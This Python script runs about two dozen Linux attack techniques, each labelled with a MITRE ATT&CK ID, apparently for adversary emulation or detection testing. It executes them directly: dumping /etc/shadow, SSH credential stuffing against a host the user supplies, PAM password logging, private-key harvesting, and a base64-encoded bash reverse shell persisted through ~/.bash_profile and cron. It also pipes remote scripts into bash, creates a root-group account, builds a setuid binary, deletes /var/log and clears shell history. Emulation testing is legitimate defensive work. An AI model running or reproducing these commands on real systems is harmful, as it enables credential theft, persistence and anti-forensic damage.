import os, datetime
import logging
import sys


# yum update -y && yum -y install make gcc at
# apt update && apt install at sshpass gcc make curl tshark net-tools -y
# install GNU packages for make 


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


cwd = os.getcwd()
evil_cmd = '''python -c \\"import os, base64;exec(base64.b64decode('aW1wb3J0IHNvY2tldCAsICAgc3VicHJvY2VzcyAsICAgb3MgIDsgICAgaG9zdD0iMTI3LjAuMC4xIiAgOyAgICBwb3J0PTQ0NCAgOyAgICBzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQgLCAgIHNvY2tldC5TT0NLX1NUUkVBTSkgIDsgICAgcy5jb25uZWN0KChob3N0ICwgICBwb3J0KSkgIDsgICAgb3MuZHVwMihzLmZpbGVubygpICwgICAwKSAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCkgLCAgIDEpICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSAsICAgMikgIDsgICAgcD1zdWJwcm9jZXNzLmNhbGwoIi9iaW4vYmFzaCIp'))\\"'''

prereq_command = '''
if [ $(cat /etc/os-release | grep -i 'Name="ubuntu"') ]; then apt update && apt install at sshpass gcc make curl tshark net-tools -y;elif [ $(cat /etc/os-release | grep -i 'ID="centos"') ]; then yum update -y && yum install make gcc at -y ; else echo "Please run this TTP on ubuntu" ; fi;
'''

try:
    os.popen(prereq_command).read()
except:
    print(bcolors.BOLD + bcolors.WARNING + 'Could not install pre requisite packages. Some of the TTPs may not execute as expected\n' + bcolors.ENDC)

T1003_008 = '''
sudo cat /etc/shadow > T1003.008.etc.shadow.txt
sudo cat /etc/passwd > T1003.008.etc.passwd.txt
'''

T1110_004_target_host = input(
    'For executing T1110_004, Enter A Host IP, you want to do ssh credential stuffing against : ')
T1110_004 = '''
cat > /tmp/usernamepass.txt << EOF
john.doe:jonathan123!
jane.doe:spongebob402
administrator:administrator90
admin:admin303
root:toor
centos:centos
john.smith:summer2019!
jane.smith:princesa29
username1:password1
username2:password2
EOF

if [ $(cat /etc/os-release | grep -i 'Name="ubuntu"') ]; then for unamepass in $(cat /tmp/usernamepass.txt);do sshpass -p `echo $unamepass | cut -d":" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d":" -f1`@''' + str(
    T1110_004_target_host) + ''';done ; else echo "Please run this TTP on ubuntu" ; fi;
'''

T1056_001 = '''
if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi; if sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi; sudo touch /tmp/password-auth.bk sudo touch /tmp/system-auth.bk sudo echo "session    required    pam_tty_audit.so enable=* log_password" >> /etc/pam.d/password-auth sudo echo "session    required    pam_tty_audit.so enable=* log_password" >> /etc/pam.d/system-auth
'''

T1040_target_interface = input('For executing T1040, Enter the Interface, you want to capture traffic on  : ')
T1040 = '''
tcpdump -c 5 -nnni ''' + str(T1040_target_interface) + '''
if [ $(cat /etc/os-release | grep -i 'Name="ubuntu"') ];then tshark -c 5 -i ''' + str(T1040_target_interface) + '''; else echo "Please run this TTP on ubuntu" ; fi;
'''

T1552_004 = '''
find / -name id_rsa 2> /dev/null | tee -a /tmp/T1552_004_privkeypath.txt
mkdir /tmp/T1552_004_privkeysfolder
find / -name id_rsa -exec cp --parents {} /tmp/T1552_004_privkeysfolder \;
find / -name id_rsa -exec rsync -R {} /tmp/T1552_004_privkeysfolder \;
'''

T1560_001_002 = '''
zip -r /tmp/pwd.zip /etc/passwd
test -e /tmp/victim-gzip.txt && gzip -k /tmp/victim-gzip.txt || (echo 'confidential! SSN: 078-05-1120 - CCN: 4000 1234 5678 9101' >> /tmp/victim-gzip.txt; gzip -k /tmp/victim-gzip.txt)
tar -cvzf /tmp/pwd.tar /etc/passwd
python3 -c "from zipfile import ZipFile; ZipFile('/tmp/passwd.zip', mode='w').write('/etc/passwd')"
python3 -c "from zipfile import ZipFile; ZipFile('/tmp/passwd.tar.gz', mode='w').write('/etc/passwd')"
'''

T1074_001 = '''
curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | bash -s > /tmp/T1074_001.log
'''

T1053_001 = '''
echo 'Hello From Atomic Red Team' | at now + 1 minute
'''

T1543_002 = '''
cat > /etc/init.d/T1543.002 << EOF
#!/bin/bash
### BEGIN INIT INFO
# Provides : Atomic Test T1543.002
# Required-Start: $all
# Required-Stop : 
# Default-Start: 2 3 4 5
# Default-Stop: 
# Short Description: Atomic Test for Systemd Service Creation
### END INIT INFO

python3 -c "import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBDcmVhdGluZyBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLmNyZWF0aW9uJykK'))"

EOF

chmod +x /etc/init.d/T1543.002
if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then update-rc.d T1543.002 defaults; elif [ $(cat /etc/os-release | grep -i 'ID="centos"') ]; then chkconfig T1543.002 on ; else echo "Please run this test on Ubnutu , kali OR centos" ; fi ;
systemctl enable T1543.002
systemctl start T1543.002

echo "python3 -c \\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgYSBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLm1vZGlmaWNhdGlvbicpCg=='))\\"" | sudo tee -a /etc/init.d/T1543.002
systemctl daemon-reload
systemctl restart T1543.002
'''

T1552_001 = '''
for file in $(find / -name .netrc 2> /dev/null);do echo $file ; cat $file ; done
grep -ri password / 2> /dev/null
'''

T1136 = '''
sudo useradd -M -N -r -s /bin/bash -c T1136_account T1136_user_1
sudo useradd -g 0 -M -d /root -s /bin/bash T1136_user_2
if [ $(cat /etc/os-release | grep -i 'Name="ubuntu"') ]; then echo "T1136_user_2:T1136_password_2" | sudo chpasswd; else echo "T1136_password_2" | passwd --stdin T1136_user_2; fi;
'''

T1037_004_rc_common = '''
filename='/etc/rc.common';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.common.original;fi
printf '%s\\n' '#!/bin/bash' | sudo tee /etc/rc.common
echo "python3 -c \\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMuY29tbW9uID4gL3RtcC9UMTAzNy4wMDQucmMuY29tbW9uJykK'))\\"" | sudo tee -a /etc/rc.common
printf '%s\\n' 'exit 0' | sudo tee -a /etc/rc.common
sudo chmod +x /etc/rc.common
'''

T1037_004_rc_local = '''
filename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.local.original;fi
printf '%s\\n' '#!/bin/bash' | sudo tee /etc/rc.local
echo "python3 -c \\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMubG9jYWwgPiAvdG1wL1QxMDM3LjAwNC5yYy5sb2NhbCcpCgo='))\\"" | sudo tee -a /etc/rc.local
printf '%s\\n' 'exit 0' | sudo tee -a /etc/rc.common
sudo chmod +x /etc/rc.local

'''

T1546_005_url = 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1546.005/src/echo-art-fish.sh'
T1546_005 = '''
trap 'nohup curl -sS ''' + T1546_005_url + ''' | bash' EXIT
exit
trap 'nohup curl -sS ''' + T1546_005_url + ''' | bash' INT
'''

T1546_004 = '''
echo "''' + str(evil_cmd) + '''" >> ~/.bash_profile
'''

T1053_003 = '''
echo "''' + str(evil_cmd) + '''" > /tmp/T1053_003.sh 
chmod +x /tmp/T1053_003.sh
echo "* * * * * /tmp/T1053_003.sh" > /tmp/T1053_003_crontab
crontab /tmp/T1053_003_crontab

echo "* * * * * /tmp/T1053_003.sh" > /etc/cron.daily/T1053_003.daily
echo "* * * * * /tmp/T1053_003.sh" > /etc/cron.hourly/T1053_003.hourly
echo "* * * * * /tmp/T1053_003.sh" > /etc/cron.monthly/T1053_003.monthly
echo "* * * * * /tmp/T1053_003.sh" > /etc/cron.weekly/T1053_003.weekly
'''

T1070 = '''
sudo rm -rf /var/log/*
'''

T1548_001_linux_c_file = '''
#include <unistd.h> 

main() 
{         
    char *ls[3];         
    ls[0] = "/bin/cat";         
    ls[1] = "/etc/shadow";         
    ls[2] =  NULL;         
    execve(ls[0],ls,NULL); 
}
'''

makefile = '''
all: T1548_001.c
	gcc -static -g -o T1548_001 T1548_001.c
'''

os.popen('sudo rm T1548_001.c makefile T1548_001').read()
T1548_001_c_file = open('T1548_001.c', 'w')
T1548_001_c_file.write(T1548_001_linux_c_file)
T1548_001_c_file.close()

T1548_001_makefile = open('makefile', 'w')
T1548_001_makefile.write(makefile)
T1548_001_makefile.close()

T1548_001 = '''
make T1548_001
sudo chown root T1548_001
sudo chmod u+s T1548_001
'''

T1070_006 = '''
touch -a -t 197001010000.00 /tmp/T1070-006-1
touch -m -t 197001010000.00 /tmp/T1070-006-2	

NOW=$(date)
date -s "1970-01-01 00:00:00"
touch /tmp/T1070-006-3
date -s "$NOW"
stat /tmp/T1070-006-3
'''

# TESTING DIFFERS BASED ON OS FLAVOR

T1553_004_ssl_dir = "/etc/ssl/certs/"

T1553_004 = '''
openssl req -subj '/CN=Temporary Cert/O=Temporary Cert/C=US' -new -newkey rsa:2048 -sha256 -days 365 -nodes -x509 -keyout T1130-key.pem -out T1130-cert.pem
sudo cp T1130-cert.pem ''' + T1553_004_ssl_dir + '''
if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then update-ca-certificates; elif [ $(cat /etc/os-release | grep -i 'ID="centos"') ]; then sudo update-ca-trust ; else echo "Please run this test on Ubnutu OR centos" ; fi ;
'''

T1562_003 = '''
export HISTCONTROL=ignoreboth
set +o history
history -c
set -o history
'''

T1552_003 = '''
cat ~/.bash_history | grep 'pass\|ssh\|rdesktop' > /tmp/T1139.txt
'''

T1059_004_url = 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh'

T1059_004 = '''
bash -c "curl -sS ''' + T1059_004_url + ''' | bash"
bash -c "wget --quiet -O - ''' + T1059_004_url + ''' | bash"
'''

TTP_NUMBERS_LINUX = ["T1543_002", "T1552_001", "T1136", "T1037_004_rc_common", "T1037_004_rc_local", "T1546_005",
                     "T1546_004", "T1053_003", "T1070", "T1548_001", "T1070_006", "T1553_004", "T1562_003", "T1552_003",
                     "T1059_004", "T1003_008", "T1110_004", "T1056_001", "T1040", "T1552_004", "T1560_001_002", "T1074_001", "T1053_001"]


TTP_LIST_LINUX = [T1543_002, T1552_001, T1136, T1037_004_rc_common, T1037_004_rc_local, T1546_005, T1546_004, T1053_003,
                  T1070, T1548_001, T1070_006, T1553_004, T1562_003, T1552_003, T1059_004, T1003_008, T1110_004,
                  T1056_001, T1040, T1552_004, T1560_001_002, T1074_001, T1053_001]

for i in range(len(TTP_LIST_LINUX)):
    try:
        print(datetime.datetime.now())
        print("")
        print(bcolors.BOLD + bcolors.FAIL + "Executing " + bcolors.OKGREEN + TTP_NUMBERS_LINUX[i] + bcolors.ENDC)
        print("")
        print(TTP_LIST_LINUX[i])
        print("")
        if TTP_NUMBERS_LINUX[i] == "T1552_001" or TTP_NUMBERS_LINUX[i] == "T1040":
            print (
                    bcolors.BOLD + bcolors.WARNING + 'If the script stays in this TTP for too long , presss ctrl + C. It will not affect execution of other TTPs.\n' + bcolors.ENDC)
        os.popen(TTP_LIST_LINUX[i]).read()
        print('-' * 160)
        with open('log.txt', 'a') as log:
            log.write(str(datetime.datetime.now()))
            log.write("\n\n")
            log.write(
                bcolors.BOLD + bcolors.FAIL + "Executing " + bcolors.OKGREEN + TTP_NUMBERS_LINUX[i] + bcolors.ENDC)
            log.write("\n")
            log.write(TTP_LIST_LINUX[i])
            log.write("\n")
            log.write(
                "------------------------------------------------------------------------------------------------------------------------------------------------------\n\n")
        print("\n")
    except:
        print ("Could not execute : " + str(TTP_LIST_LINUX[i]))

print(bcolors.BOLD + bcolors.WARNING + "MANUALLY RUN ./T1548_001 AS NON ROOT USER\n\n" + bcolors.ENDC)

'''

T1543_002
T1552_001
T1136
T1037_004_rc_common
T1037_004_rc_local
T1546_005
T1546_004
T1053_003
T1070
T1548_001
T1070_006
T1553_004
T1562_003
T1552_003
T1059_004

'''

